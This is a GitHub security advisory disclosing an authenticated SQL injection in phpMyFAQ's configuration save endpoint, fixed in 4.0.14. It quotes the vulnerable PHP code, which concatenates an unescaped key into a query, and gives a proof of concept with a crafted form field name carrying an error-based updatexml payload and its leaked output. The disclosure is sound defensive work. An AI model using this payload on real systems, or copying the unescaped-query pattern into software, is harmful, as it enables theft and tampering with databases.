# [H] phpMyFAQ has Authenticated SQL Injection in Configuration Update Functionality

## Summary
Severity: High
Advisory: GHSA-fxm2-cmwj-qvx4
CVE: CVE-2025-62519
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-11-17
Source: https://github.com/advisories/GHSA-fxm2-cmwj-qvx4
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.0.14
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.0.14

## Details
### Summary

An authenticated SQL injection vulnerability in the main configuration update functionality of phpMyFAQ (v4.0.13 and prior) allows a privileged user with 'Configuration Edit' permissions to execute arbitrary SQL commands. Successful exploitation can lead to a full compromise of the database, including reading, modifying, or deleting all data, as well as potential remote code execution depending on the database configuration.

### Details

The vulnerability exists in the `save` method within the `src/phpMyFAQ/Controller/Administration/ConfigurationTabController.php` controller. This method handles the saving of application-wide configuration settings. It retrieves all submitted form data as an associative array via `$request->get('edit')`.

The core of the issue is that while the *values* of this array are processed, the *keys* are trusted implicitly and are not sanitized or validated.

**File:** `src/phpMyFAQ/Controller/Administration/ConfigurationTabController.php`
```php
// ...
public function save(Request $request): JsonResponse
{
    $this->userHasPermission(PermissionType::CONFIGURATION_EDIT);

    $configurationData = $request->get('edit');
    // ...
    
    foreach ($configurationData as $key => $value) {
        // The key from the user input is used to build the $newConfigValues array.
        $newConfigValues[$key] = (string) $value;
        // ...
    }

    // ...
    // The array, containing user-controlled keys, is passed to the model.
    $this->configuration->update($newConfigValues);

    return $this->json(['success' => Translation::get('ad_config_saved')], Response::HTTP_OK);
}
```

The `$newConfigValues` array, which contains user-controlled keys, is then passed to the `update` method in the `src/phpMyFAQ/Configuration.php` model. Here, the key (`$name`) is directly concatenated into a raw SQL query string.

**File:** `src/phpMyFAQ/Configuration.php`
```php
public function update(array $newConfigs): bool
{
    // ...
    foreach ($newConfigs as $name => $value) {
        if ($name != 'main.phpMyFAQToken' && !in_array($name, $runtimeConfigs)) {
            // VULNERABLE CODE: The array key '$name' is not escaped and is directly
            // concatenated into the SQL query string. The value is escaped, but not the name.
            $update = sprintf(
                "UPDATE %s%s SET config_value = '%s' WHERE config_name = '%s'",
                Database::getTablePrefix(),
                $this->tableName,
                $this->getDb()->escape(trim($value)),
                $name
            );

            $this->getDb()->query($update);
            // ...
        }
    }

    return true;
}
```
An attacker can craft a malicious form parameter name (which becomes the array key) to break out of the single quotes in the `WHERE` clause and inject arbitrary SQL commands.

### PoC (Proof of Concept)

**Prerequisites:**
1.  A running instance of phpMyFAQ (v4.0.13 confirmed vulnerable).
2.  An authenticated user session with permissions to edit the configuration.

**Execution:**
Due to the application's CSRF protection, the easiest way to reproduce this is by capturing a legitimate request to save the configuration and modifying it using a proxy tool like Burp Suite's Repeater.

1.  Log in as an administrator and navigate to **Administration** -> **Configuration**.
2.  Make a trivial change (e.g., toggle a setting) and click "Save configuration". Capture this `POST` request to `/admin/api/configuration`.
3.  Send the captured request to Repeater. The request will contain a valid `Cookie` header and a `pmf-csrf-token` parameter.
4.  Modify the request body to inject a malicious key. Add a new `multipart/form-data` part with a crafted `name` attribute.

**Example Malicious Request Body Part (Error-Based):**

```
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="edit[dummykey' and updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0, 1), 0x7e), 1) and '1]"

true
------WebKitFormBoundaryRandomString
```
*Note: You must also include the `pmf-csrf-token` part from the original request in the body.*

**Result:**
The server will respond with a `500 Internal Server Error`, and the body of the response will contain a database error message, confirming the SQL injection. The leaked data will be present within the error string.

```
An error occurred: XPATH syntax error: '~faq_faqadminlog~' at line 311 at /var/www/html/src/phpMyFAQ/Database/Mysqli.php
```

This error confirms the successful execution of the injected `updatexml` payload, which has extracted and revealed the name of the first table in the database (`faq_faqadminlog`). Time-based blind techniques can also be used to extract data without relying on error messages.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-fxm2-cmwj-qvx4
- https://nvd.nist.gov/vuln/detail/CVE-2025-62519
- https://github.com/thorsten/phpMyFAQ
- https://github.com/thorsten/phpMyFAQ/compare/4.0.13...4.0.14
